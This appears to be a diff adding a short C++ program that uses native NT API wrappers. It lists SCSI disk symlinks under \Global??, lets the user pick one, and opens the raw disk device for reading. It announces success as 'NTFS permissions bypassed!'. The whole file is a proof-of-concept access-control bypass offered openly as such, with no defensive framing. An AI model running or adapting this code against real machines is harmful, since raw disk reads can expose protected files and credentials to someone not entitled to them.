@@ -1,0 +1,75 @@
+#include <iostream>
+#include "wrapper.hpp"
+
+int main()
+{
+	const std::wstring global = L"\\Global??";
+
+	auto directory = nt::string::init_unicode_string(global);
+	auto attributes = nt::object::initialize_attributes(
+		&directory,
+		nt::object::case_insensitive,
+		nullptr);
+	auto handle = nt::directory::open(
+		nt::directory::dir_query,
+		&attributes);
+	
+	std::cout << "\\Global?? = " << handle << std::endl;
+
+	auto objects = nt::directory::query(handle);
+	for (auto& [ index, object ] : objects)
+	{
+		if (object->name().find(L"SCSI#") != std::string::npos)
+		{
+			std::wcout << "[" << index << "] " << object->name() << std::endl;
+		}
+	}
+
+	std::cout << "Pick a disk: ";
+
+	int index = -1;
+	std::cin >> index;
+
+	auto disk_name = objects.find(index)->second->name();
+	disk_name = std::wstring(L"\\Global??\\").append(disk_name);
+	auto disk_name_unicode = nt::string::init_unicode_string(disk_name);
+	attributes = nt::object::initialize_attributes(
+		&disk_name_unicode,
+		nt::object::case_insensitive,
+		nullptr);
+
+	auto disk = nt::symlink::open(
+		nt::symlink::link_query,
+		&attributes);
+	const auto device = nt::symlink::query(disk);
+	
+	std::wcout << "Device path: " << device << std::endl;
+
+	auto device_unicode = nt::string::init_unicode_string(device);
+	attributes = nt::object::initialize_attributes(
+		&device_unicode,
+		nt::object::case_insensitive,
+		nullptr);
+	handle = nt::file::open(
+		device,
+		winapi::file::generic_read,
+		&attributes,
+		nt::file::attribute_normal,
+		0,
+		nt::file::file_open);
+
+	std::wcout << device << " = " << handle << std::endl;
+
+	if (handle)
+	{
+		std::cout << "NTFS permissions bypassed!" << std::endl;
+	}
+	else
+	{
+		std::cout << "Failed bypassing NTFS permissions!" << std::endl;
+	}
+
+	std::cin.ignore();
+	std::cin.get();
+	return 0;
+}
